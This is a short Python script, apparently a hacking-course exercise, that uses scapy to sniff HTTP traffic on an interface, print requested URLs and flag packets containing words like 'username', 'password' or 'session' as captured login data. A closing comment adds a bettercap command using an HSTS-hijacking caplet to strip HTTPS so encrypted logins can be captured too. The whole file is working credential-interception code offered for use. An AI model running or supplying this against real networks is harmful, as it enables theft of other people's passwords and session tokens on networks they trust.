#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        try:
            # Attempt to decode the Raw payload
            load = packet[scapy.Raw].load.decode("utf-8")
            if not load:
                load = packet[scapy.Raw].load.decode()
            keywords = ["username", "user", "login", "password", "pass", "name", "usr", "email", "key", "session"]
            for keyword in keywords:
                if keyword in load:
                    return load
        except UnicodeDecodeError:
            # Ignore packets that can't be decoded
            pass
    return None

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode())
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >> " + login_info + "\n\n")

sniff("eth0")

#to run https: bettercap -iface eth0 -caplet hstshijack/hstshijack
